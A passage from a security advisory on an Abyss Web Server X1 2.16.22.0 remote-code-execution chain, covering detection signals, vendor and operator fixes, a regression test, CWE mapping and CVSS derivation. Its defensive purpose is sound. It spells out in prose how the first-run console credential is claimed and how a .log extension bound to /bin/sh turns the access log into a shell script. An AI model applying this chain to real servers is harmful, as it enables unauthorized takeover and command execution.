   which are rare in benign traffic and are the payload's signature.
6. Repeated unauthenticated `GET /console/` probes from many hosts, which indicate window surveying.

Conversely, there is no meaningful host-based anomaly: the executed command is a child of the server
process, its parent is the product's own CGI machinery, and no new binary, new port or new account is
required.

## 11. Fix Recommendations

### Fix Recommendations — vendor-side, ordered by root cause

The order below is deliberate: the first item removes the intersection that makes the configuration plane
an execution plane, the second removes the width that makes the intersection reachable, the third removes
the unauthenticated creation semantics, and only then come validation and privilege measures. Fixing in the
reverse order - starting with the log writer - would not break this chain.

1. **Refuse any interpreter mapping whose extension or target path can coincide with a log destination (or
   with any server-written file).** This is the root-cause fix and it is cheap. At configuration-commit
   time, cross-check every `<interpreters><interpreter><ext>` value against every host `<log><file>`
   extension and against the product's own known output extensions; refuse the pair, or refuse the write
   with a specific error, rather than committing it and letting the intersection execute. Independently,
   refuse to bind a general-purpose interpreter - `/bin/sh`, `/bin/bash`, `/bin/dash`, `cmd.exe`, `powershell`
   and equivalents - to any extension at all without an explicit, separately confirmed override, since a
   data extension bound to a shell has no legitimate use in a web server's own configuration.
2. **Do not let a console form write an arbitrary vpath-to-interpreter pair in one action.** The scripting
   subtree should validate the pair as a unit: a CGI script-path scope that would place a server-written
   destination inside script scope must be rejected or must prompt for an acknowledgement naming the
   collision. In particular, a `<paths><path><vpath>` of `/` is scope-wide by construction and should
   require explicit acknowledgement; a per-subdirectory requirement is the safer default.
3. **Constrain the log destination.** Normalise and canonicalise any path accepted from a console path
   control, resolve it against the server's own directory root, and reject destinations inside the document
   root, inside any CGI script path, inside any interpreter directory, or outside an allowed log directory.
   The console file browser should be restricted to the same allowed subtrees rather than enumerating the
   filesystem from its root; a read-only whole-filesystem browser is an unnecessary gift to an attacker who
   needs to learn the document root.
4. **Make console credential creation unreachable from the network.** Generate the initial credential
   locally at first start - a random password written into the configuration file with root-only file
   permissions and printed to the startup terminal, or a forced interactive setup on the local console or
   installer - so that the credential always exists before the console listener can serve a creation form.
   If a network-visible creation step is kept for compatibility, bind it to the loopback interface only, or
   require a one-time setup token obtained from the local filesystem. The current startup message is
   effectively an invitation to whoever can see port 9999; whatever else changes, that invitation should not
   be broadcast on all interfaces.
5. **Narrow the console's default exposure.** Bind the console to `127.0.0.1` by default, treat
   non-loopback binding as an explicit opt-in with a warning, and replace the hardcoded `ipcontrol` allow
   ranges (which currently include the whole of `10.0.0.1-10.255.255.254` and the other RFC1918 blocks plus
   IPv6 ULA and link-local) with a default of loopback-only plus explicit operator opt-in per range. The
   shipped documentation's "recommended" framing of an all-interface bind should change with it.
6. **Add cross-site protection to configuration writes.** HTTP Basic with no session cookie and no CSRF
   token means every console form is submittable from any page an administrator's browser can reach. A
   same-site token on mutating forms would remove that class independently of the window issue.
7. **Privilege separation as a hardening default.** Run the request-serving worker under a dedicated
   unprivileged account regardless of how the process was started, reserving root only for the bind
   operation on low ports (or use `CAP_NET_BIND_SERVICE`), and document the runtime identity so operators
   can audit it. Make `--allow-root` a flag that warns on use. This does not fix the chain - it caps it, and
   it caps the population of deployments where a server compromise is a host compromise.
8. **Modernise credential storage and add throttling.** Replace MD5 password retention with a
   memory-hard or bcrypt-class digest, and add rate limiting and lockout on console Basic authentication.
   `antihack` defaulting to `enabled no` while the console has no independent throttling is worth reviewing
   as part of the same change. Neither item is required to break this chain, and neither is scored here.
9. **Exhaust the remaining parser surface as a hardening exercise.** The CVE-2021-3328 family - chunked
   transfer state machine, multipart ranges, `Expect` handling and the HTTP/2 glue - was not reached by this
   work, but a product with one publicly recorded parser bug in more than twenty years has more surface than
   its history suggests.

### Fix Recommendations — a regression test the vendor should add

A single configuration-time assertion would have prevented this class entirely, and it is easy to write:

- commit a configuration in which a host log destination has extension `log` inside the document root and an
  interpreter binds `ext=log` to `/bin/sh` with `<paths><path><vpath>/</vpath>`;
- assert that the commit is **rejected**, with an error naming the collision;
- and separately assert that `GET` on such a log path returns the file as content (`200`, `text/plain`)
  rather than executing it (`500` plus a `CGI: [/bin/sh ...]` entry in `cgi.log`).

A complementary test: from a first-run configuration, assert that `GET /console/credentials` from a
non-loopback interface answers `404` or refuses the connection, and that the credential exists in the
configuration before the console listener accepts its first connection.

### Fix Recommendations — operator-side, until a patch exists

Operators running this product can close the chain today without vendor changes:

1. **Arm the console immediately after installation**, and treat the interval between starting the service
   and setting the password as an incident-grade exposure window. Automation that installs and starts the
   server should arm it in the same step.
2. **Never redeploy from a pristine configuration without arming it in the same operation.** Container
   images, host images and CLI redeployments that regenerate the configuration re-open the window; bake the
   credential into the image or into the entrypoint.
3. **Restrict the console at the network layer.** Bind it to loopback (`<bindip> 127.0.0.1 </bindip>` on the
   console node), or firewall port 9999 to specific management addresses, and never publish it through NAT
   or a reverse proxy without an authentication layer in front of it.
4. **Check the console's `ipcontrol` block** and remove allow ranges you do not need; be aware that the
   default includes the whole of RFC1918 rather than your own subnet.
5. **Audit the configuration for the three collision signals**: a `<log><file>` inside the document root; an
   interpreter whose `<file>` is a shell; a `<paths><path><vpath>` of `/`. Any one of these is worth
   investigating regardless of this advisory.
6. **Watch `cgi.log`** for `CGI: [/bin/sh ...]` lines naming data files, and the access log for `500`
   responses on `.log`, `.txt`, `.bak` or `.tmp` paths.
7. **Run the server under a dedicated unprivileged account** and do not pass `--allow-root`; on port 80 use
   a bind capability, a port redirect, or a listening socket handed in by the init system.
8. **Rotate the console credential if you cannot establish who set it.** A minted credential is
   indistinguishable from a legitimate one, so a deployment whose arming history is unknown should be
   re-armed from the local filesystem - which is also the recovery the product documents.
9. **Consider enabling the `antihack` protection system** as defence in depth. Its effect on this specific
   payload was not measured, so it should be treated as a supplementary control and not as a fix.

## 12. CWE and CVSS

### CWE and CVSS — classification

| Classification | Assignment | Justification |
|---|---|---|
| Primary | **CWE-306** Missing Authentication for Critical Function | `POST /console/credentials` performs the product's most critical function - creating its administrator - with no authentication while the first-run configuration state holds, on a listener bound to every interface, restricted only by a default source-address filter that admits the whole private address space |
| Co-equal | **CWE-78** Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') | attacker-controlled `User-Agent` bytes reach `/bin/sh` reading the access log as a script; the semicolon segment executes. Neutralisation is absent because the writing parser and the reading parser disagree about what a quotation mark means |
| Contributing | **CWE-284** Improper Access Control | the console's default `ipcontrol` allow set plus an all-interface bind make the management plane the whole private network |
| Contributing | **CWE-73** External Control of File Name or Path | the log form accepts an arbitrary absolute destination and the console browser enumerates the filesystem |
| Contributing | **CWE-362** Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') | the takeover is a race between the attacker and the administrator to arm the endpoint; first arrival wins |
| Contributing | **CWE-352** Cross-Site Request Forgery | configuration writes carry no CSRF token and the console has no session cookie |
| Contributing | **CWE-328** Use of Weak Hash | console passwords are retained as MD5 digests |
| Contributing | **CWE-250** Execution with Unnecessary Privileges | no privilege separation is enforced between binding a low port and serving CGI children |

The two primary classifications are co-equal rather than ordered: removing the unauthenticated creation
endpoint removes the attacker's ability to write configuration, and removing the interpreter/log collision
removes the ability to turn configuration into execution, while all other weaknesses discussed here would
remain. Per the accuracy discipline this advisory follows, the contributing weaknesses are reported
separately from the RCE vector and none of them raises any metric in the score below.

### CWE and CVSS — vector derivation

**Published vector: `CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` = 7.5 (High).**

Metric by metric:

| Metric | Value | Weight | Why |
|---|---|---|---|
| Attack Vector | **Adjacent** (`AV:A`) | 0.62 | the console binds every interface but its default `ipcontrol` admits loopback, all three RFC1918 ranges and IPv6 ULA/link-local, and refuses public-internet sources; the evaluation is on the connected socket peer and was measured not to be influenced by forwarding headers. Adjacent is the position that the shipped default actually permits. `AV:N` is published below as a labelled conditional for deployments that widen the console's reach |
| Attack Complexity | **High** (`AC:H`) | 0.44 | success requires arriving inside the first-run window, before the administrator arms the endpoint; the endpoint answers `401` afterwards and the window's field duration is not something an attacker controls. The state is cheap to poll, which is why an `AC:L` conditional is also published, but the condition itself is outside the attacker's control |
| Privileges Required | **None** (`PR:N`) | 0.85 | the chain head is an unauthenticated creation endpoint. The administrator credential used later is minted by that same unauthenticated request; no credential belonging to anyone else is consumed, so no privilege was required to start |
| User Interaction | **None** (`UI:N`) | 0.85 | no administrator action, no click, no visit to a malicious page and no browser is needed at any step |
| Scope | **Unchanged** (`S:U`) | - | see the Scope decision below |
| Confidentiality | **High** (`C:H`) | 0.56 | arbitrary command execution as the server process reads every served document, every TLS private key reachable by the console and every file the server identity can read |
| Integrity | **High** (`I:H`) | 0.56 | the whole configuration tree and the served content are writable, and the executed command can modify anything the server identity can |
| Availability | **High** (`A:H`) | 0.56 | hosts can be stopped, the service restarted at will, and the arbitrary-path log write alone permits disk exhaustion |

Arithmetic, using the CVSS 3.1 formula and its round-up-to-the-tenth convention:

```
ISS          = 1 - ((1 - 0.56) * (1 - 0.56) * (1 - 0.56))
             = 1 - 0.44^3
             = 1 - 0.085184
             = 0.914816

Impact(S:U)  = 6.42 * ISS
             = 6.42 * 0.914816
             = 5.873119

Exploitability = 8.22 * AV * AC * PR * UI
               = 8.22 * 0.62 * 0.44 * 0.85 * 0.85
               = 1.620146

Base(S:U)    = min(Impact + Exploitability, 10)
             = min(5.873119 + 1.620146, 10)
             = 7.493264
Roundup      = 7.5
```

### CWE and CVSS — the Scope decision

**Scope is Unchanged.** The alternative was considered seriously and rejected, and the rejection is worth
showing because the argument for Changed is superficially attractive: the vulnerable component is the
console's configuration subsystem and the impact lands on a different subsystem - the host listener - and
eventually on the operating system, which reads like a boundary crossing. It is not one, for three reasons.

First, both listeners belong to a single product and a single process family (a CLI master and a
`--slave --interactive` service process); the console and the host plane are two doors into one authority,
not two authorities. Rewriting configuration and having the serving process act on it is the product's
documented, intended behaviour: the console exists precisely to control the host listener, and a restart is
the sanctioned way to apply changes.

Second, the executed command runs with the identity of the server process itself. No different security
authority is crossed: the CGI child is a child of the server, with the server's uid, in the server's
filesystem view. Cross-machine or cross-account outcomes can justify Changed; running as the same service
identity on the same host does not.

Third, the operating-system-level consequences depend on how the deployment runs the server, which is
established as deployment-dependent in section 10. Scoring Changed on the strength of a root deployment we
could not prove as the shipped default would be exactly the kind of inflation the surrounding discipline
exists to prevent.

For completeness, the Scope-Changed variant of the published metrics -
`CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` - computes to 8.4 (ISS 0.914816, Impact(S:C) 6.128026,
Exploitability 1.620146, base 1.08 times 7.748172 = 8.368026, rounded up to 8.4). It is not published as the
score for this finding, for the reasons above.

### CWE and CVSS — conditional readings, labelled as such

Two conditions would raise the rating; neither is proven for a default installation, so neither becomes the
headline.

**Conditional A - the window is effectively permanent.** Where the console is left unarmed for a long time
- automation that installs and never arms, appliances staged before deployment, development instances left
running, or containers and host images rebuilt from a pristine configuration on every restart - the
attacker is not racing a human at all: they poll an unauthenticated endpoint whose state costs one request
to read, and they win by construction. Under that deployment state the timing condition is not a real
condition, and Attack Complexity is Low:

- `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **8.8** (High). Exploitability 8.22 times 0.62 times 0.77
  times 0.85 times 0.85 = 2.835255, Impact 5.873119, base 8.708373, rounded up to 8.8.

**Conditional B - the console is also reachable from the network.** Where an operator publishes port 9999
(NAT rule, port forward, all-interface bind on a publicly addressed host, or a same-host reverse proxy whose
forwarded traffic presents a permitted socket peer), the network position becomes Network rather than
Adjacent. Combined with Conditional A this is the worst shape:

- `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **9.8** (Critical). Exploitability 3.887043, base
  9.760161, rounded up to 9.8.
- and with the window contested rather than open, `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` = **8.1**
  (High), Exploitability 2.221167, base 8.094286.

Each of these conditionals is internally consistent with the vector printed next to it, and none of them
replaces the published score. An operator should read Conditional B as the reason to firewall port 9999 and
Conditional A as the reason to arm the console in the same automation step that installs it.

### CWE and CVSS — what is deliberately not published

- **No score assumes internet reachability for a default installation.** The shipped default refuses public
  sources on the console, and the headline vector says `AV:A`.
- **No score assumes root.** The privilege ceiling is deployment-dependent (section 10); the impact metrics
  reflect the compromise of the product and its data, which holds under a dedicated low-privilege service
  account as much as under uid 0. Root was observed on our instance and is stated as an observation, not
  scored as a default.
- **No score is raised by the amplifiers.** The default `ipcontrol` breadth, MD5 password storage, the
  absence of CSRF protection, the absence of login throttling and the absence of privilege separation are
  real weaknesses and are reported to the vendor in their own right; none is folded into the RCE vector.
- **No score is attached to the standalone items** - the arbitrary-path log write and the console file
  browser's read-only filesystem enumeration - because scoring them here would double-count primitives
  already carried by the chain.
- **No pre-existing numeric score was inherited.** The sources behind this advisory carried no computed CVSS
  value, so there was no recorded figure to correct; every number published here was computed from the
  vector with the CVSS 3.1 formula and rounded up to the nearest tenth.
- **The parser memory-safety family is not scored**, because it was not tested. It is named for the vendor
  as unexhausted surface.

### CWE and CVSS — summary

| Reading | Vector | Score | Severity | Status |
|---|---|---|---|---|
| **Published** | `CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` | **7.5** | High | what the shipped default permits and what the attacker must race for |
| Conditional A | `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | 8.8 | High | where the window is left open indefinitely, labelled conditional |
| Conditional B | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | 9.8 | Critical | where the console is also exposed to a network, labelled conditional |
| Conditional B' | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` | 8.1 | High | exposed console but contested window, labelled conditional |
| Rejected | `CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` | 8.4 | High | Scope Changed considered and rejected, see above |

One sentence for the vendor's engineers: an unauthenticated network client can become the administrator of a
freshly deployed Abyss Web Server X1 2.16.22.0 before anybody else arrives, and from there three ordinary
configuration forms - a CGI scope of `/`, a log destination inside the document root, and a `.log`
extension bound to `/bin/sh` - convert an access log into a shell script that any anonymous request
executes. Rated 7.5 High for a default installation, where the attacker must be on the same private
network and must win the setup race.
